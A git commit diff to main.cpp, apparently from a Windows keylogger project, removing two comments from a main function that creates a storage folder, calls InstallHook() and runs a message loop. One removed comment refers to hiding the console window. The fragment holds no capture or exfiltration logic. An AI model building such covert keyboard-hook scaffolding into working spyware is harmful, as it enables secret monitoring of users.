87c3a4496b1cec8738ddc52f6162ab34db611774
Utkarsh shukla <utkarshthehellmaster@gmail.com>
2018-09-09 19:51:12 +0530

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -11,12 +11,11 @@
 using namespace std;
 
 int main(){
-    // Settings -> Compiler: Have compiler follow ISO C++ 11 standard and create a WindowsAPI flag
+
     MSG Msg;
     IO::MKDir(IO::GetOurPath(true));
 
     InstallHook();
-    // solve the console problem (Dirty way of hiding the console window)
     while(GetMessageA(&Msg, NULL, 0, 0)){
         TranslateMessage(&Msg);
         DispatchMessage(&Msg);
